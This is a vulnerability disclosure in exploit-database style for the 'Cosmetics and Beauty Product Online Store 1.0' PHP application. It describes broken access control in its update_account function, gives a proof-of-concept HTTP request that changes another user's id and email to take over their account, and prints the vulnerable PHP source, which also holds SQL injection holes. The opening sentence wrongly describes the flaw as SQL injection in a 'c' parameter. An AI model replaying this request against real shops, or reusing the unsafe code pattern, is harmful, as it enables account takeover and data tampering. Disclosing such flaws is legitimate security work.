# Exploit Title: Cosmetic and Beauty Products Online Shop 1.0 - Broken Access Control with Update account funtions

The c parameter on category detail on Cosmetics-and-Beauty-Product-Online-Store v1.0 appears to be vulnerable to SQL injection attacks. 

### Date: 
> 15 Apr 2023

### Author: 
> tht1997
### Vendor Homepage:
> https://www.sourcecodester.com
### Software Link:
> [Cosmetics and Beauty Product Online Store](https://www.sourcecodester.com/php/15181/cosmetics-and-beauty-product-online-store-phpoop-free-source-code.html)
### Version:
> v 1.0

# Tested On: Windows 10, XAMPP

### Affected Page:
> /cbpos/classes/Master.php?f=update_account


### Description:
> Broken Access Control via ID user can change info, password of other account client on Cosmetics-and-Beauty-Product-Online-Store v1.0.

### Proof of Concept:
> Following steps are involved:
1. Visit the vulnerable page: /cbpos/?p=edit_account
2. Edit your account and view request
Request
```
POST /cbpos/classes/Master.php?f=update_account HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 154
Origin: http://localhost
Connection: close
Referer: http://localhost/cbpos/?p=edit_account
Cookie: eid=2; download_started=0; plupload_ui_view=thumbs; PowerBB_username=tuanth; PowerBB_password=32298fc135b3fecf012a4c27efbba188; jstree_select=1; PHPSESSID=51spndcudrtniksvqgp19cifo8
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=CHANGE_ID&firstname=account+1&lastname=bBAC&contact=122222222&gender=Male&default_delivery_address=hn&email=account1%40gmail.com&password=&cpassword=test123%40
```

3. Change id, email of other account and view result

Before:

![Example Image](https://drive.google.com/uc?id=1nyfDONIKVN2GmVSQMa0P3DeJKzrj-Cnv)

After:

![Example Image](https://drive.google.com/uc?id=19ty_CGmKCAOyU1jP_aH2Ewdh-MSLb1qR)

4. CODE
```
function update_account(){
		if(!empty($_POST['password']))
			$_POST['password'] = md5($password);
		else
			unset($_POST['password']);
		extract($_POST);
		$data = "";
		if(md5($cpassword) != $this->settings->userdata('password')){
			$resp['status'] = 'failed';
			$resp['msg'] = "Current Password is Incorrect";
			return json_encode($resp);
			exit;
		}
		$check = $this->conn->query("SELECT * FROM `clients`  where `email`='{$email}' and `id` != $id ")->num_rows;
		if($check > 0){
			$resp['status'] = 'failed';
			$resp['msg'] = "Email already taken.";
			return json_encode($resp);
			exit;
		}
		foreach($_POST as $k =>$v){
			if($k == 'cpassword' || ($k == 'password' && empty($v)))
				continue;
				if(!empty($data)) $data .=",";
					$data .= " `{$k}`='{$v}' ";
		}
		$save = $this->conn->query("UPDATE `clients` set $data where id = $id ");
		if($save){
			foreach($_POST as $k =>$v){
				if($k != 'cpassword')
				$this->settings->set_userdata($k,$v);
			}
			
			$this->settings->set_userdata('id',$this->conn->insert_id);
			$resp['status'] = 'success';
			$this->settings->set_flashdata('success',' Your Account Details has been updated successfully.');
		}else{
			$resp['status'] = 'failed';
			$resp['error'] = $this->conn->error;
		}
		return json_encode($resp);
```

### Impact:
> Broken access control vulnerability is a type of security flaw that allows an unauthorized user access to restricted resources. Attacker can change other account info and account takeover
